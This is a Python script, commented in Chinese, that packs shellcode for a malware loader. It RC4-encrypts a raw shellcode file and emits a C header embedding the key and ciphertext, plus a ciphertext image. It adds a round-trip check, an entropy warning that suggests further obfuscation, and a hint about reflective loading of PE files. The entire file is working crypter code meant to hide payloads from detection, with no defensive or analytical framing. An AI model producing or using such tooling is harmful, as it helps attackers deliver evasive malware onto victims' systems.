#!/usr/bin/env python3
# 载荷打包器：shellcode → RC4（密钥派生）→ payload.h（嵌入 loader）+ payload.bin（密文镜像）
# 用法：python3 payload.py <shellcode.bin> [key]   → 输出 payload.h / payload.bin
#   key 缺省时随机 16 字节 hex（生成后打印完整 key，构建记录留档）
# 自检：生成后立即解密回读比对原文（round-trip 校验），不一致即退出报错——
#        loader 端"密态回置=回拷密文"依赖本文件产出的密文与 loader 内嵌 KEY 严格一致。
import sys, os

def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    out = bytearray(); i = j = 0
    for b in data:
        i = (i + 1) % 256; j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def entropy(data: bytes) -> float:
    from collections import Counter
    import math
    c = Counter(data)
    return -sum(n/len(data) * math.log2(n/len(data)) for n in c.values())

def main():
    if len(sys.argv) < 2:
        print("用法：python3 payload.py <shellcode.bin> [key]"); sys.exit(1)
    sc = open(sys.argv[1], 'rb').read()
    key = (sys.argv[2] if len(sys.argv) > 2 else os.urandom(16).hex()).encode()
    enc = rc4(key, sc)

    # round-trip 自检：解密回读必须与原文一致
    dec = rc4(key, enc)
    if dec != sc:
        print("[-] round-trip 校验失败（解密回读 ≠ 原文）——终止，不产出"); sys.exit(2)

    hdr = f"// 自动生成（payload.py）：原文 {len(sc)} 字节，RC4 加密后 {len(enc)} 字节\n"
    arr = ','.join(str(b) for b in enc)
    with open('payload.h', 'w') as f:
        f.write(hdr)
        f.write(f'static const char KEY[] = "{key.decode()}";\n')
        f.write(f'static const unsigned char BUF[] = {{{arr}}};\n')
        f.write(f'static const unsigned int LEN = {len(enc)};\n')
    with open('payload.bin', 'wb') as f:
        f.write(enc)

    print(f"[+] payload.h / payload.bin 生成（原文 {len(sc)}B → 密文 {len(enc)}B）")
    print(f"[+] key = {key.decode()}")
    print(f"[+] round-trip 校验通过（解密回读 == 原文）")
    e = entropy(enc)
    print(f"[+] 密文熵 {e:.2f} bit/byte（{'⚠ 偏低，考虑载荷混淆后再打包' if e < 6.0 else 'OK'}）")
    if sc[:2] == b'MZ':
        print("[+] 提示：输入是 PE 而非 raw shellcode——如非刻意（反射加载），先转 shellcode")

if __name__ == '__main__':
    main()
